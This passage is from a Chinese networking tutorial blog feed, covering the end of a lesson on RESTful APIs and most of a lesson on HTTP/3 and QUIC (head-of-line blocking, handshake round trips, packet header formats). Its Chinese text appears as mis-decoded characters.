3ï¼šAPIæµ‹è¯•</h3><p>ä½¿ç”¨Postmanæˆ–curlæµ‹è¯•ä»Šå¤©çš„ç”¨æˆ·ç®¡ç†APIï¼š</p><ol><li>æµ‹è¯•æ‰€æœ‰ç«¯ç‚¹</li><li>æµ‹è¯•è¾¹ç•Œæƒ…å†µ</li><li>æµ‹è¯•é”™è¯¯å¤„ç†</li></ol><hr><h2 id="8-æ‰©å±•é˜…è¯»"><a href="#8-æ‰©å±•é˜…è¯»" class="headerlink" title="8. æ‰©å±•é˜…è¯»"></a>8. æ‰©å±•é˜…è¯»</h2><ul><li>RESTæ¶æ„è®ºæ–‡ï¼ˆRoy Fieldingï¼‰</li><li>HTTP&#x2F;1.1è§„èŒƒï¼ˆRFC 7231-7235ï¼‰</li><li>JSON APIè§„èŒƒ</li><li>OpenAPI&#x2F;Swaggeræ–‡æ¡£è§„èŒƒ</li></ul><hr><p><strong>è¿›åº¦ï¼š30&#x2F;120å¤©ï¼ˆ25.0%ï¼‰</strong></p><p>æ­å–œå®Œæˆç¬¬30å¤©å­¦ä¹ ï¼ä½ å·²ç»æŒæ¡äº†RESTful APIè®¾è®¡çš„æ ¸å¿ƒåŸåˆ™ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ WebSocketå®æ—¶é€šä¿¡ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>29å¤©ï¼šHTTP/3å’ŒQUICåè®®</title>
    <link href="/2025/11/10/29%E5%A4%A9%EF%BC%9AHTTP_3%E5%92%8CQUIC%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/29%E5%A4%A9%EF%BC%9AHTTP_3%E5%92%8CQUIC%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬29å¤©ï¼šHTTP-3å’ŒQUICåè®®"><a href="#ç¬¬29å¤©ï¼šHTTP-3å’ŒQUICåè®®" class="headerlink" title="ç¬¬29å¤©ï¼šHTTP&#x2F;3å’ŒQUICåè®®"></a>ç¬¬29å¤©ï¼šHTTP&#x2F;3å’ŒQUICåè®®</h1><blockquote><p>â€œHTTP&#x2F;3å°±åƒç»™äº’è”ç½‘è£…ä¸Šäº†ç«ç®­å¼•æ“ï¼Œæ›´å¿«ã€æ›´ç¨³ã€æ›´å¯é ï¼â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡"><a href="#ğŸ“š-ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ğŸ“š ä»Šæ—¥ç›®æ ‡"></a>ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£HTTP&#x2F;2çš„é—ç•™é—®é¢˜</li><li>æŒæ¡QUICåè®®çš„æ ¸å¿ƒç‰¹æ€§</li><li>å­¦ä¹ HTTP&#x2F;3çš„æ”¹è¿›</li><li>ç†è§£0-RTTè¿æ¥å»ºç«‹</li><li>äº†è§£UDPåœ¨ä¼ è¾“å±‚çš„åº”ç”¨</li></ul><hr><h2 id="1-ä¸ºä»€ä¹ˆéœ€è¦HTTP-3ï¼Ÿ"><a href="#1-ä¸ºä»€ä¹ˆéœ€è¦HTTP-3ï¼Ÿ" class="headerlink" title="1. ä¸ºä»€ä¹ˆéœ€è¦HTTP&#x2F;3ï¼Ÿ"></a>1. ä¸ºä»€ä¹ˆéœ€è¦HTTP&#x2F;3ï¼Ÿ</h2><h3 id="1-1-HTTP-2çš„é—®é¢˜"><a href="#1-1-HTTP-2çš„é—®é¢˜" class="headerlink" title="1.1 HTTP&#x2F;2çš„é—®é¢˜"></a>1.1 HTTP&#x2F;2çš„é—®é¢˜</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs inform7">HTTP/2è™½ç„¶è§£å†³äº†åº”ç”¨å±‚çš„é˜Ÿå¤´é˜»å¡ï¼Œ<br>ä½†åœ¨ä¼ è¾“å±‚ä»ç„¶å­˜åœ¨é—®é¢˜ï¼š<br><br>TCPå±‚é˜Ÿå¤´é˜»å¡ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  HTTP/2è¿æ¥ï¼ˆåŸºäºTCPï¼‰                     â”‚<br>â”‚  â”œâ”€ æµ1: <span class="hljs-comment">[åŒ…1]</span><span class="hljs-comment">[åŒ…2]</span><span class="hljs-comment">[åŒ…3]</span>                   â”‚<br>â”‚  â”œâ”€ æµ2: <span class="hljs-comment">[åŒ…1]</span><span class="hljs-comment">[åŒ…2]</span><span class="hljs-comment">[åŒ…3]</span>                   â”‚<br>â”‚  â””â”€ æµ3: <span class="hljs-comment">[åŒ…1]</span><span class="hljs-comment">[åŒ…2]</span><span class="hljs-comment">[åŒ…3]</span>                   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>         â†“<br>    TCPä¼ è¾“å±‚<br>         â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å¦‚æœæµ1çš„åŒ…2ä¸¢å¤±ï¼š                        â”‚<br>â”‚  â”œâ”€ æµ1: <span class="hljs-comment">[åŒ…1]</span> <span class="hljs-comment">[X]</span> <span class="hljs-comment">[ç­‰å¾…]</span>                 â”‚<br>â”‚  â”œâ”€ æµ2: <span class="hljs-comment">[åŒ…1]</span> <span class="hljs-comment">[åŒ…2]</span> <span class="hljs-comment">[ç­‰å¾…]</span> â† è¢«é˜»å¡ï¼    â”‚<br>â”‚  â””â”€ æµ3: <span class="hljs-comment">[åŒ…1]</span> <span class="hljs-comment">[åŒ…2]</span> <span class="hljs-comment">[ç­‰å¾…]</span> â† è¢«é˜»å¡ï¼    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>é—®é¢˜ï¼š<br>TCPè¦æ±‚æŒ‰åºäº¤ä»˜ï¼Œä¸€ä¸ªåŒ…ä¸¢å¤±ä¼šé˜»å¡æ‰€æœ‰åç»­åŒ…<br>å³ä½¿å…¶ä»–æµçš„æ•°æ®å·²ç»åˆ°è¾¾ï¼Œä¹Ÿå¿…é¡»ç­‰å¾…<br><br>ç”Ÿæ´»åŒ–ç±»æ¯”ï¼š<br>TCP = å•è½¨ç«è½¦<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-comment">[è½¦å¢1]</span><span class="hljs-comment">[è½¦å¢2]</span><span class="hljs-comment">[X]</span><span class="hljs-comment">[è½¦å¢4]</span>... â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>è½¦å¢3è„±è½¨ â†’ åé¢æ‰€æœ‰è½¦å¢éƒ½è¦ç­‰å¾…<br><br>QUIC = å¤šè½¨é“ç‹¬ç«‹åˆ—è½¦<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ è½¨é“1: <span class="hljs-comment">[è½¦å¢1]</span><span class="hljs-comment">[è½¦å¢2]</span><span class="hljs-comment">[è½¦å¢3]</span>â”‚<br>â”‚ è½¨é“2: <span class="hljs-comment">[è½¦å¢1]</span><span class="hljs-comment">[X]</span><span class="hljs-comment">[ç­‰å¾…]</span>     â”‚ â† åªå½±å“è½¨é“2<br>â”‚ è½¨é“3: <span class="hljs-comment">[è½¦å¢1]</span><span class="hljs-comment">[è½¦å¢2]</span><span class="hljs-comment">[è½¦å¢3]</span>â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="1-2-å…¶ä»–é—®é¢˜"><a href="#1-2-å…¶ä»–é—®é¢˜" class="headerlink" title="1.2 å…¶ä»–é—®é¢˜"></a>1.2 å…¶ä»–é—®é¢˜</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP/2çš„å…¶ä»–é™åˆ¶ï¼š<br><br><span class="hljs-bullet">1.</span> è¿æ¥å»ºç«‹æ…¢<br>   TCPæ¡æ‰‹ï¼š1-RTT<br>   TLSæ¡æ‰‹ï¼š1-2 RTT<br>   æ€»è®¡ï¼š2-3 RTTæ‰èƒ½å‘é€æ•°æ®<br><br>   ç¤ºä¾‹ï¼ˆé¦–æ¬¡è¿æ¥ï¼‰ï¼š<br>   å®¢æˆ·ç«¯ â†’ SYN                     â†’ æœåŠ¡å™¨<br>   å®¢æˆ·ç«¯ â† SYN-ACK                 â† æœåŠ¡å™¨  (1-RTT)<br>   å®¢æˆ·ç«¯ â†’ ACK                     â†’ æœåŠ¡å™¨<br><br>   å®¢æˆ·ç«¯ â†’ Client Hello            â†’ æœåŠ¡å™¨<br>   å®¢æˆ·ç«¯ â† Server Hello, è¯ä¹¦ç­‰     â† æœåŠ¡å™¨  (2-RTT)<br>   å®¢æˆ·ç«¯ â†’ Client Finished         â†’ æœåŠ¡å™¨<br><br>   å®¢æˆ·ç«¯ â†’ HTTPè¯·æ±‚                â†’ æœåŠ¡å™¨  (3-RTT)<br><br>   æ€»å»¶è¿Ÿï¼š3-RTT<br><br><span class="hljs-bullet">2.</span> è¿æ¥è¿ç§»å›°éš¾<br><span class="hljs-bullet">   -</span> TCPè¿æ¥ç”±å››å…ƒç»„æ ‡è¯†ï¼ˆæºIPã€æºç«¯å£ã€ç›®æ ‡IPã€ç›®æ ‡ç«¯å£ï¼‰<br><span class="hljs-bullet">   -</span> WiFiåˆ‡æ¢åˆ°4Gï¼ŒIPå˜åŒ– â†’ è¿æ¥æ–­å¼€ â†’ éœ€è¦é‡æ–°å»ºç«‹<br><br><span class="hljs-bullet">3.</span> æ¡æ‰‹å†—ä½™<br><span class="hljs-bullet">   -</span> TCPå’ŒTLSåˆ†åˆ«æ¡æ‰‹<br><span class="hljs-bullet">   -</span> æ•°æ®é‡å¤ï¼ˆå¦‚éšæœºæ•°ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="2-QUICåè®®è¯¦è§£"><a href="#2-QUICåè®®è¯¦è§£" class="headerlink" title="2. QUICåè®®è¯¦è§£"></a>2. QUICåè®®è¯¦è§£</h2><h3 id="2-1-QUICæ¦‚è¿°"><a href="#2-1-QUICæ¦‚è¿°" class="headerlink" title="2.1 QUICæ¦‚è¿°"></a>2.1 QUICæ¦‚è¿°</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">QUIC (Quick UDP Internet Connections)<br><br>æ ¸å¿ƒç‰¹ç‚¹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  QUIC = UDP + å¯é æ€§ + åŠ å¯† + å¤šè·¯å¤ç”¨  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>åè®®æ ˆå¯¹æ¯”ï¼š<br><br><span class="hljs-section">HTTP/2:</span><br><span class="hljs-section">åº”ç”¨å±‚:  HTTP/2</span><br><span class="hljs-section">ä¼ è¾“å±‚:  TCP</span><br><span class="hljs-section">å®‰å…¨å±‚:  TLS 1.2/1.3</span><br><span class="hljs-section">ç½‘ç»œå±‚:  IP</span><br><br><span class="hljs-section">HTTP/3:</span><br><span class="hljs-section">åº”ç”¨å±‚:  HTTP/3</span><br><span class="hljs-section">ä¼ è¾“å±‚:  QUIC (åŒ…å«åŠ å¯†ã€å¯é æ€§)</span><br><span class="hljs-section">ç½‘ç»œå±‚:  UDP + IP</span><br><br>ä¼˜åŠ¿ï¼š<br>âœ… 0-RTTæˆ–1-RTTè¿æ¥å»ºç«‹<br>âœ… æ— é˜Ÿå¤´é˜»å¡<br>âœ… è¿æ¥è¿ç§»<br>âœ… æ”¹è¿›çš„æ‹¥å¡æ§åˆ¶<br>âœ… å‰å‘çº é”™ï¼ˆFECï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-2-QUICè¿æ¥å»ºç«‹"><a href="#2-2-QUICè¿æ¥å»ºç«‹" class="headerlink" title="2.2 QUICè¿æ¥å»ºç«‹"></a>2.2 QUICè¿æ¥å»ºç«‹</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">QUICæ¡æ‰‹æµç¨‹ï¼ˆ1-RTTï¼‰ï¼š</span><br><br><span class="hljs-string">é¦–æ¬¡è¿æ¥ï¼š</span><br><span class="hljs-string">å®¢æˆ·ç«¯</span> <span class="hljs-string">â†’</span> <span class="hljs-string">Initial</span> <span class="hljs-string">Packet</span>                    <span class="hljs-string">â†’</span> <span class="hljs-string">æœåŠ¡å™¨</span><br>         <span class="hljs-string">(Client</span> <span class="hljs-string">Hello</span> <span class="hljs-string">+</span> <span class="hljs-string">QUICå‚æ•°)</span><br><span class="hljs-string">å®¢æˆ·ç«¯</span> <span class="hljs-string">â†</span> <span class="hljs-string">Handshake</span> <span class="hljs-string">Packet</span>                  <span class="hljs-string">â†</span> <span class="hljs-string">æœåŠ¡å™¨</span>  <span class="hljs-string">(1-RTT)</span><br>         <span class="hljs-string">(Server</span> <span class="hljs-string">Hello</span> <span class="hljs-string">+</span> <span class="hljs-string">è¯ä¹¦</span> <span class="hljs-string">+</span> <span class="hljs-string">Finished)</span><br><span class="hljs-string">å®¢æˆ·ç«¯</span> <span class="hljs-string">â†’</span> <span class="hljs-string">Handshake</span> <span class="hljs-string">Packet</span> <span class="hljs-string">+</span> <span class="hljs-string">Application</span> <span class="hljs-string">Data</span> <span class="hljs-string">â†’</span> <span class="hljs-string">æœåŠ¡å™¨</span><br>         <span class="hljs-string">(Finished</span> <span class="hljs-string">+</span> <span class="hljs-string">HTTPè¯·æ±‚)</span><br><br><span class="hljs-string">æ€»å»¶è¿Ÿï¼š1-RTTå³å¯å‘é€æ•°æ®ï¼</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">å†æ¬¡è¿æ¥ï¼ˆ0-RTTï¼‰ï¼š</span><br><span class="hljs-string">å®¢æˆ·ç«¯ä¿å­˜äº†æœåŠ¡å™¨çš„é…ç½®å’Œå¯†é’¥</span><br><span class="hljs-string">å®¢æˆ·ç«¯</span> <span class="hljs-string">â†’</span> <span class="hljs-string">Initial</span> <span class="hljs-string">Packet</span> <span class="hljs-string">+</span> <span class="hljs-string">Application</span> <span class="hljs-string">Data</span> <span class="hljs-string">â†’</span> <span class="hljs-string">æœåŠ¡å™¨</span><br>         <span class="hljs-string">(ä¹‹å‰çš„å¯†é’¥</span> <span class="hljs-string">+</span> <span class="hljs-string">HTTPè¯·æ±‚)</span><br><br><span class="hljs-string">æ€»å»¶è¿Ÿï¼š0-RTTï¼æ•°æ®ç«‹å³å‘é€ï¼</span><br><br><span class="hljs-string">å¯¹æ¯”ï¼š</span><br><span class="hljs-string">HTTP/2</span> <span class="hljs-string">é¦–æ¬¡è¿æ¥:</span> <span class="hljs-number">3</span><span class="hljs-string">-RTT</span><br><span class="hljs-string">HTTP/3</span> <span class="hljs-string">é¦–æ¬¡è¿æ¥:</span> <span class="hljs-number">1</span><span class="hljs-string">-RTT</span>  <span class="hljs-string">âœ…</span> <span class="hljs-string">å¿«2å€</span><br><br><span class="hljs-string">HTTP/2</span> <span class="hljs-string">å†æ¬¡è¿æ¥:</span> <span class="hljs-number">2</span><span class="hljs-string">-RTT</span> <span class="hljs-string">(TLSä¼šè¯æ¢å¤)</span><br><span class="hljs-string">HTTP/3</span> <span class="hljs-string">å†æ¬¡è¿æ¥:</span> <span class="hljs-number">0</span><span class="hljs-string">-RTT</span>  <span class="hljs-string">âœ…</span> <span class="hljs-string">æ— å»¶è¿Ÿ</span><br></code></pre></td></tr></table></figure><h3 id="2-3-QUICæ•°æ®åŒ…ç»“æ„"><a href="#2-3-QUICæ•°æ®åŒ…ç»“æ„" class="headerlink" title="2.3 QUICæ•°æ®åŒ…ç»“æ„"></a>2.3 QUICæ•°æ®åŒ…ç»“æ„</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">QUICæ•°æ®åŒ…æ ¼å¼ï¼š<br><br>é•¿å¤´éƒ¨æ ¼å¼ï¼ˆLong <span class="hljs-keyword">Header</span>ï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-keyword">Header</span> Form (<span class="hljs-number">1</span>) = <span class="hljs-number">1</span>                      â”‚<br>â”‚ Fixed <span class="hljs-type">Bit</span> (<span class="hljs-number">1</span>) = <span class="hljs-number">1</span>                        â”‚<br>â”‚ Long Packet <span class="hljs-keyword">Type</span> (<span class="hljs-number">2</span>)                     â”‚<br>â”‚ <span class="hljs-keyword">Type</span>-Specific Bits (<span class="hljs-number">4</span>)                   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Version (<span class="hljs-number">32</span>)                             â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Destination <span class="hljs-keyword">Connection</span> ID Length (<span class="hljs-number">8</span>)     â”‚<br>â”‚ Destination <span class="hljs-keyword">Connection</span> ID (<span class="hljs-number">0.</span><span class="hljs-number">.160</span>)       â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Source <span class="hljs-keyword">Connection</span> ID Length (<span class="hljs-number">8</span>)          â”‚<br>â”‚ Source <span class="hljs-keyword">Connection</span> ID (<span class="hljs-number">0.</span><span class="hljs-number">.160</span>)            â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ <span class="hljs-keyword">Type</span>-Specific Payload                    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>çŸ­å¤´éƒ¨æ ¼å¼ï¼ˆShort <span class="hljs-keyword">Header</span>ï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-keyword">Header</span> Form (<span class="hljs-number">1</span>) = <span class="hljs-number">0</span>                      â”‚<br>â”‚ Fixed <span class="hljs-type">Bit</span> (<span class="hljs-number">1</span>) = <span class="hljs-number">1</span>                        â”‚<br>â”‚ Spin <span class="hljs-type">Bit</span> (<span class="hljs-number">1</span>)                             â”‚<br>â”‚ Reserved Bits (<span class="hljs-number">2</span>)                        â”‚<br>â”‚ Key Phase (<span class="hljs-number">1</span>)                            â”‚<br>â”‚ Packet Number Length (<span class="hljs-number">2</span>)                 â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Destination <span class="hljs-keyword">Connection</span> ID (<span class="hljs-number">0.</span><span class="hljs-number">.160</span>)       â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Packet Number (<span class="hljs-number">8.</span><span class="hljs-number">.32</span>)                    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Protected Payload                        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å…³é”®å­—æ®µï¼š<br>- <span class="hljs-keyword">Connection</span> ID: è¿æ¥æ ‡è¯†ç¬¦ï¼ˆä¸æ˜¯IP+ç«¯å£ï¼‰<br>- Packet Number: åŒ…åºå·ï¼ˆç”¨äºç¡®è®¤å’Œé‡ä¼ ï¼‰<br>- Protected Payload: åŠ å¯†çš„è´Ÿè½½<br></code></pre></td></tr></table></figure><h3 id="2-4-QUICæµï¼ˆStreamï¼‰"><a href="#2-4-QUICæµï¼ˆStreamï¼‰" class="headerlink" title="2.4 QUICæµï¼ˆStreamï¼‰"></a>2.4 QUICæµï¼ˆStreamï¼‰</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">QUIC</span>æµçš„ç‰¹ç‚¹ï¼š<br><br><span class="hljs-number">1.</span> ç‹¬ç«‹çš„æµ<br>   æ¯ä¸ªæµæœ‰ç‹¬ç«‹çš„åºå·ç©ºé—´<br>   ä¸€ä¸ªæµçš„ä¸¢åŒ…ä¸å½±å“å…¶ä»–æµ<br><br>ç¤ºä¾‹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  <span class="hljs-symbol">QUIC</span>è¿æ¥                                â”‚<br>â”‚  â”œâ”€ æµ<span class="hljs-number">0</span>: [åŒ…<span class="hljs-number">0</span>][åŒ…<span class="hljs-number">1</span>][åŒ…<span class="hljs-number">2</span>] âœ… å®Œæˆ        â”‚<br>â”‚  â”œâ”€ æµ<span class="hljs-number">4</span>: [åŒ…<span class="hljs-number">0</span>][<span class="hljs-symbol">X</span>][ç­‰å¾…]  â¸ï¸ åªå½±å“æµ<span class="hljs-number">4</span>  â”‚<br>â”‚  â”œâ”€ æµ<span class="hljs-number">8</span>: [åŒ…<span class="hljs-number">0</span>][åŒ…<span class="hljs-number">1</span>][åŒ…<span class="hljs-number">2</span>] âœ… å®Œæˆ        â”‚<br>â”‚  â””â”€ æµ<span class="hljs-number">12</span>:[åŒ…<span class="hljs-number">0</span>][åŒ…<span class="hljs-number">1</span>]      âœ… ç»§ç»­ä¼ è¾“    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><span class="hljs-number">2.</span> æµçš„ç±»å‹<br>   - å•å‘æµï¼šåªèƒ½å•å‘å‘é€æ•°æ®<br>   - 